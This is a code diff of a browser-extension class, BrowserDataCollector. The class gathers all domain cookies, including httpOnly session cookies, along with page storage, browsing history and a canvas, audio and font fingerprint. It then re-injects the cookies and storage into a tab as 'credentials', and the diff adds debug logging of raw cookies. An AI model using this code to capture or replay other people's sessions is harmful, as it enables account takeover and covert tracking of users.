@@ -1,6 +1,7 @@
 class BrowserDataCollector {
-    static async collectAllBrowserData(url = Constants.DOMAINS.MAIN.URL, tabId = null) {
+    static async collectAllBrowserData(url, tabId, domainConfig, currentTab) {
         try {
+            
             const browserData = {
                 ipAddress: null,
                 userAgent: navigator.userAgent,
@@ -54,25 +55,28 @@ class BrowserDataCollector {
 
     static async collectCookies(url) {
         try {
-            const cookies = {}
+            if (!url) {
+                const activeTabResult = await this.getActiveTab()
+                if (activeTabResult.success && activeTabResult.data?.url) {
+                    url = activeTabResult.data.url
+                } else {
+                    return {}
+                }
+            }
+            
             const domain = new URL(url).hostname
             
             const allCookies = await new Promise(resolve => {
                 chrome.cookies.getAll({ domain: domain }, resolve)
             })
 
+            const cookiesObject = {}
             allCookies.forEach(cookie => {
-                cookies[cookie.name] = {
-                    value: cookie.value,
-                    domain: cookie.domain,
-                    path: cookie.path,
-                    secure: cookie.secure,
-                    httpOnly: cookie.httpOnly,
-                    expirationDate: cookie.expirationDate
-                }
+                cookiesObject[cookie.name] = cookie
             })
+            
 
-            return cookies
+            return cookiesObject
         } catch (error) {
             console.error('Error collecting cookies:', error)
             return {}
@@ -82,64 +86,41 @@ class BrowserDataCollector {
 
     static async collectStorageData(tabId) {
         try {
+            const tab = await chrome.tabs.get(tabId)
             const results = await chrome.scripting.executeScript({
                 target: { tabId: tabId },
-                func: () => {
-                    const storageData = {
-                        localStorage: {},
-                        sessionStorage: {},
-                        errors: []
-                    }
-
-                    try {
-                        for (let i = 0; i < localStorage.length; i++) {
-                            const key = localStorage.key(i)
-                            if (key) {
-                                storageData.localStorage[key] = localStorage.getItem(key)
-                            }
-                        }
-                    } catch (e) {
-                        storageData.errors.push(`localStorage: ${e.message}`)
-                    }
-
-                    try {
-                        for (let i = 0; i < sessionStorage.length; i++) {
-                            const key = sessionStorage.key(i)
-                            if (key) {
-                                storageData.sessionStorage[key] = sessionStorage.getItem(key)
-                            }
-                        }
-                    } catch (e) {
-                        storageData.errors.push(`sessionStorage: ${e.message}`)
-                    }
-
-                    return storageData
-                }
+                files: ['scripts/collectStorage.js'],
+                world: 'MAIN'
             })
 
             const result = results[0]?.result
-            if (result?.errors?.length > 0) {
-                console.warn('Storage collection warnings:', result.errors)
-            }
             
             return {
                 localStorage: result?.localStorage || {},
-                sessionStorage: result?.sessionStorage || {}
+                sessionStorage: result?.sessionStorage || {},
+                timestamp: result?.timestamp,
+                url: result?.url,
+                debug: result?.debug
             }
         } catch (error) {
-            console.warn('Content script injection failed:', error.message)
+            console.error('❌ Storage collection failed:', error)
+            console.error('❌ Error details:', error.message, error.stack)
             return {
                 localStorage: {},
-                sessionStorage: {}
+                sessionStorage: {},
+                error: error.message,
+                errorDetails: error.stack
             }
         }
     }
 
 
-    static async collectFingerprint() {
+    static async getScreenInfo() {
         try {
-            const fingerprint = {
-                screen: {
+            // In extension context, screen object may not be available
+            // Try to get screen info from content script or use fallback
+            if (typeof screen !== 'undefined') {
+                return {
                     width: screen.width,
                     height: screen.height,
                     availWidth: screen.availWidth,
@@ -147,7 +128,36 @@ class BrowserDataCollector {
                     colorDepth: screen.colorDepth,
                     pixelDepth: screen.pixelDepth,
                     orientation: screen.orientation?.type || null
-                },
+                }
+            } else {
+                // Fallback for extension service worker context
+                return {
+                    width: null,
+                    height: null,
+                    availWidth: null,
+                    availHeight: null,
+                    colorDepth: null,
+                    pixelDepth: null,
+                    orientation: null
+                }
+            }
+        } catch (error) {
+            return {
+                width: null,
+                height: null,
+                availWidth: null,
+                availHeight: null,
+                colorDepth: null,
+                pixelDepth: null,
+                orientation: null
+            }
+        }
+    }
+
+    static async collectFingerprint() {
+        try {
+            const fingerprint = {
+                screen: await this.getScreenInfo(),
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 language: navigator.language,
                 languages: navigator.languages,
@@ -164,12 +174,12 @@ class BrowserDataCollector {
                     rtt: navigator.connection.rtt,
                     saveData: navigator.connection.saveData
                 } : null,
-                plugins: Array.from(navigator.plugins).map(p => ({
+                plugins: navigator.plugins ? Array.from(navigator.plugins).map(p => ({
                     name: p.name,
                     description: p.description,
                     filename: p.filename,
                     length: p.length
-                })),
+                })) : [],
                 mediaDevices: await this.getMediaDevices(),
                 webgl: await this.getWebGLFingerprint(),
                 canvas: await this.getCanvasFingerprint(),
@@ -211,6 +221,11 @@ class BrowserDataCollector {
 
     static async getCanvasFingerprint() {
         try {
+            // Check if DOM is available (not in service worker context)
+            if (typeof document === 'undefined') {
+                return null
+            }
+            
             const canvas = document.createElement('canvas')
             const ctx = canvas.getContext('2d')
             
@@ -235,11 +250,16 @@ class BrowserDataCollector {
 
     static async getAudioFingerprint() {
         try {
+            // Check if audio context is available (not in service worker context)
+            if (typeof window === 'undefined' || (!window.AudioContext && !window.webkitAudioContext)) {
+                return null
+            }
+            
+            // Use a simpler audio fingerprinting approach without deprecated ScriptProcessorNode
             const audioContext = new (window.AudioContext || window.webkitAudioContext)()
             const oscillator = audioContext.createOscillator()
             const analyser = audioContext.createAnalyser()
             const gainNode = audioContext.createGain()
-            const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1)
             
             oscillator.type = 'triangle'
             oscillator.frequency.setValueAtTime(10000, audioContext.currentTime)
@@ -247,19 +267,23 @@ class BrowserDataCollector {
             gainNode.gain.setValueAtTime(0, audioContext.currentTime)
             
             oscillator.connect(analyser)
-            analyser.connect(scriptProcessor)
-            scriptProcessor.connect(gainNode)
+            analyser.connect(gainNode)
             gainNode.connect(audioContext.destination)
+            
+            analyser.fftSize = 2048
+            const bufferLength = analyser.frequencyBinCount
+            const dataArray = new Uint8Array(bufferLength)
             
             oscillator.start(0)
             
             return new Promise((resolve) => {
-                scriptProcessor.onaudioprocess = function(bins) {
-                    const hash = bins.inputBuffer.getChannelData(0).reduce((a, b) => a + b, 0)
+                setTimeout(() => {
+                    analyser.getByteFrequencyData(dataArray)
+                    const hash = Array.from(dataArray).reduce((a, b) => a + b, 0)
                     oscillator.stop()
                     audioContext.close()
                     resolve({ hash: hash.toString() })
-                }
+                }, 100)
                 
                 setTimeout(() => resolve(null), 1000)
             })
@@ -271,6 +295,11 @@ class BrowserDataCollector {
 
     static async detectFonts() {
         try {
+            // Check if DOM is available (not in service worker context)
+            if (typeof document === 'undefined') {
+                return []
+            }
+            
             const baseFonts = ['monospace', 'sans-serif', 'serif']
             const testFonts = [
                 'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana',
@@ -295,18 +324,27 @@ class BrowserDataCollector {
     }
 
     static async isFontAvailable(font, baseFonts) {
-        const testString = 'mmmmmmmmmmlli'
-        const testSize = '72px'
-        const canvas = document.createElement('canvas')
-        const context = canvas.getContext('2d')
+        try {
+            // Check if DOM is available
+            if (typeof document === 'undefined') {
+                return false
+            }
+            
+            const testString = 'mmmmmmmmmmlli'
+            const testSize = '72px'
+            const canvas = document.createElement('canvas')
+            const context = canvas.getContext('2d')
         
-        context.font = testSize + ' ' + baseFonts[0]
-        const baselineWidth = context.measureText(testString).width
-        
-        context.font = testSize + ' ' + font + ', ' + baseFonts[0]
-        const fontWidth = context.measureText(testString).width
-        
-        return fontWidth !== baselineWidth
+            context.font = testSize + ' ' + baseFonts[0]
+            const baselineWidth = context.measureText(testString).width
+            
+            context.font = testSize + ' ' + font + ', ' + baseFonts[0]
+            const fontWidth = context.measureText(testString).width
+            
+            return fontWidth !== baselineWidth
+        } catch (error) {
+            return false
+        }
     }
 
     static async getMediaDevices() {
@@ -474,12 +512,13 @@ class BrowserDataCollector {
     }
 
 
-    static async collectBrowserHistory(maxResults = 100) {
+    static async collectBrowserHistory() {
         try {
             if (!chrome.history) {
                 return { error: 'History permission not granted' }
             }
             
+            const maxResults = 100
             const historyItems = await chrome.history.search({
                 text: '',
                 maxResults: maxResults,
@@ -673,24 +712,22 @@ class BrowserDataCollector {
         }
     }
 
-    static async collectFromActiveTab(url = null) {
+    static async getBrowserData(url = null, tabId = null, domainConfig = null, currentTab = null) {
         try {
-            const activeTabResult = await this.getActiveTab()
-            if (!activeTabResult.success || !activeTabResult.data) {
-                return await this.collectAllBrowserData(url)
+            if (!url || !tabId) {
+                const activeTabResult = await this.getActiveTab()
+                if (activeTabResult.success && activeTabResult.data) {
+                    tabId = activeTabResult.data.id
+                    url = activeTabResult.data.url
+                    currentTab = activeTabResult.data
+                }
+                
+                domainConfig = await Constants.getCurrentDomain()
             }
+            
 
-            const targetUrl = url || activeTabResult.data.url || Constants.DOMAINS.MAIN.URL
-            return await this.collectAllBrowserData(targetUrl, activeTabResult.data.id)
-        } catch (error) {
-            console.error('Error collecting from active tab:', error)
-            return await this.collectAllBrowserData(url)
-        }
-    }
-
-    static async getBrowserData(url = Constants.DOMAINS.MAIN.URL) {
-        try {
-            const collectionResult = await this.collectFromActiveTab(url)
+            
+            const collectionResult = await this.collectAllBrowserData(url, tabId, domainConfig, currentTab)
             
             if (!collectionResult.success) {
                 return collectionResult
@@ -715,6 +752,7 @@ class BrowserDataCollector {
                 credentialSource: 'auto_detected'
             }
             
+            console.log('cookeis in get brower method', formattedData.cookies)
             return {
                 success: true,
                 error: null,
@@ -731,29 +769,45 @@ class BrowserDataCollector {
         }
     }
 
-    static async setBrowserData(tabId, credentials) {
+    static async setBrowserData(tabId, credentials, url) {
         try {
             const results = []
-
             if (credentials.cookies) {
-                for (const [name, cookieData] of Object.entries(credentials.cookies)) {
+                const cookiesArray = Object.values(credentials.cookies)
+                console.log('raw cookies: ', credentials.cookies)
+
+                console.log('cookeis array: ', cookiesArray)
+
+                for (const cookieData of cookiesArray) {
                     try {
-                        const cookieResult = await chrome.cookies.set({
-                            url: `https://${cookieData.domain}`,
-                            name: name,
+                        
+                        // Ensure domain consistency: if domain has leading dot, keep it; if not, don't let Chrome add it
+                        let domain = cookieData.domain
+                        if (domain && !domain.startsWith('.')) {
+                            // For domains without leading dot, use URL-based setting to prevent Chrome from adding dot
+                            domain = undefined // Let Chrome use URL's domain
+                        }
+                        
+                        const cookieToSet = {
+                            url: url,
+                            name: cookieData.name,
                             value: cookieData.value,
-                            domain: cookieData.domain,
-                            path: cookieData.path || '/',
-                            secure: cookieData.secure || false,
-                            httpOnly: cookieData.httpOnly || false,
+                            domain: domain,
+                            path: cookieData.path,
+                            secure: cookieData.secure,
+                            httpOnly: cookieData.httpOnly,
+                            sameSite: cookieData.sameSite,
                             expirationDate: cookieData.expirationDate
-                        })
-                        results.push({ type: 'cookie', name, success: !!cookieResult })
+                        }
+                        
+                        const cookieResult = await chrome.cookies.set(cookieToSet)
+                        results.push({ type: 'cookie', name: cookieData.name, success: !!cookieResult })
                     } catch (error) {
-                        results.push({ type: 'cookie', name, success: false, error: error.message })
+                        results.push({ type: 'cookie', name: cookieData.name, success: false, error: error.message })
                     }
                 }
             }
+
 
             if (credentials.localStorage || credentials.sessionStorage) {
                 try {
